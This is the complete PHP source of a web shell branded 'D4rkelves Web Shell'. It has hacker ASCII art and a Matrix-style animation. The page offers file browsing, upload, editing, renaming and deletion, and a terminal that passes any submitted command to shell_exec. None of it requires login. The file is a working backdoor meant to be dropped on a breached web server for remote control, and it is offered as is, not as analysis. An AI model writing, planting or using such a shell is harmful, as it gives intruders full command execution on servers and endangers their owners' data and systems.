<?php
session_start();
$root = realpath(__DIR__);
$path = isset($_GET['path']) ? realpath($root . '/' . $_GET['path']) : $root;
if (strpos($path, $root) !== 0) die("Access denied.");
$currentRelPath = str_replace($root, '', $path);
if (!isset($_SESSION['cmd_history'])) $_SESSION['cmd_history'] = [];

if (isset($_FILES['file'])) {
    $uploadFile = $path . '/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
}
if (isset($_GET['delete'])) {
    $fileToDelete = realpath($path . '/' . basename($_GET['delete']));
    if (strpos($fileToDelete, $root) === 0 && file_exists($fileToDelete)) unlink($fileToDelete);
}
if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldPath = realpath($path . '/' . basename($_POST['old_name']));
    $newPath = $path . '/' . basename($_POST['new_name']);
    if (strpos($oldPath, $root) === 0 && file_exists($oldPath)) rename($oldPath, $newPath);
}
if (isset($_GET['edit'])) {
    $editPath = realpath($path . '/' . basename($_GET['edit']));
    if (strpos($editPath, $root) === 0 && is_file($editPath)) {
        $fileContents = htmlspecialchars(file_get_contents($editPath));
        echo <<<HTML
        <form method="POST"><textarea name="file_content" class="editor">{$fileContents}</textarea>
        <input type="hidden" name="file_path" value="{$_GET['edit']}">
        <br><button class="btn" type="submit">Save</button></form><hr>
        HTML;
    }
}
if (isset($_POST['file_content']) && isset($_POST['file_path'])) {
    $savePath = realpath($path . '/' . basename($_POST['file_path']));
    if (strpos($savePath, $root) === 0) file_put_contents($savePath, $_POST['file_content']);
}
$terminal_output = '';
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    chdir($path);
    $terminal_output = shell_exec($command . ' 2>&1');
    $_SESSION['cmd_history'][] = $command;
    if (count($_SESSION['cmd_history']) > 10) array_shift($_SESSION['cmd_history']);
}
$files = scandir($path);
?>
<!DOCTYPE html>
<html>
<head>
<title>D4rkelves Web Shell</title>
<style>
html, body {margin:0; padding:0; background:#000; color:#0f0; font-family:monospace;}
canvas#matrix {position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1;}
.container {padding:20px; background-color:rgba(0,0,0,0.9);}
pre.logo {font-size:13px; line-height:1.2; color:#0f0; white-space:pre;}
a {color:#0f0; text-decoration:none; margin-right:10px;}
table {width:100%; border-collapse:collapse; margin-top:10px;}
th, td {border:1px solid #0f0; padding:6px;}
input, textarea, button {background:#111; color:#0f0; border:1px solid #0f0; font-family:monospace; padding:4px;}
.editor {width:100%; height:300px;}
.output {width:100%; height:200px; margin-top:10px; background:#000; color:#0f0; padding:10px;}
.btn {cursor:pointer;}
ul {padding-left:20px;}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="container">
<pre class="logo">

________      _______________ ____  __. ___________.__                      
\______ \    /  |  \______   \    |/ _| \_   _____/|  |___  __ ____   ______
 |    |  \  /   |  ||       _/      <    |    __)_ |  |\  \/ // __ \ /  ___/
 |    `   \/    ^   /    |   \    |  \   |        \|  |_\   /\  ___/ \___ \ 
/_______  /\____   ||____|_  /____|__ \ /_______  /|____/\_/  \___  >____  >
        \/      |__|       \/        \/         \/                \/     \/ 
                  
</pre>
<h2>💀 D4rkelves Web Shell</h2>
<p><strong>Path:</strong> <?php echo $currentRelPath ?: '/'; ?></p>
<p>
<?php if ($path !== $root): ?>
<a href="?path=<?php echo urlencode(dirname(str_replace($root, '', $path))); ?>">⬅️ Back</a>
<?php endif; ?>
<a href="?">🏠 Root</a>
</p>

<h3>📤 Upload</h3>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file" required />
<button class="btn" type="submit">Upload</button>
</form>

<h3>📁 Files</h3>
<table>
<tr><th>Name</th><th>Actions</th></tr>
<?php foreach ($files as $file): if ($file === '.' || $file === '..') continue; ?>
<tr><td>
<?php
$fullPath = $path . '/' . $file;
$isDir = is_dir($fullPath);
if ($isDir) {
    $subPath = str_replace($root, '', realpath($fullPath));
    echo "📁 <a href=\"?path=" . urlencode($subPath) . "\">" . htmlspecialchars($file) . "</a>";
} else {
    echo "📄 " . htmlspecialchars($file);
}
?></td><td>
<?php if (!$isDir): ?>
<a href="?path=<?php echo urlencode($currentRelPath); ?>&edit=<?php echo urlencode($file); ?>">✏ Edit</a>
<a href="?path=<?php echo urlencode($currentRelPath); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete <?php echo $file; ?>?')">🗑 Delete</a>
<form method="POST" class="inline">
<input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file); ?>" />
<input type="text" name="new_name" placeholder="New name" required />
<button class="btn" type="submit">🔁 Rename</button>
</form>
<?php endif; ?>
</td></tr>
<?php endforeach; ?>
</table>

<h3>💻 Terminal</h3>
<form method="POST">
<input type="text" name="cmd" placeholder="Enter command..." style="width:80%;" />
<button class="btn" type="submit">Run</button>
</form>
<?php if ($terminal_output): ?>
<textarea readonly class="output" id="terminal"><?php echo htmlspecialchars($terminal_output); ?></textarea>
<?php endif; ?>

<h4>📜 History</h4>
<ul>
<?php foreach (array_reverse($_SESSION['cmd_history']) as $cmd): ?>
<li><?php echo htmlspecialchars($cmd); ?></li>
<?php endforeach; ?>
</ul>
</div>

<script>
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.height = window.innerHeight;
canvas.width = window.innerWidth;
let chars = "01abcdefghijklmnopqrstuvwxyzアカサタナハマヤラワ".split('');
let fontSize = 14;
let columns = canvas.width / fontSize;
let drops = Array(Math.floor(columns)).fill(1);
function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0F0";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height || Math.random() > 0.95) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 35);
const term = document.getElementById("terminal");
if (term) term.scrollTop = term.scrollHeight;
</script>
</body>
</html>
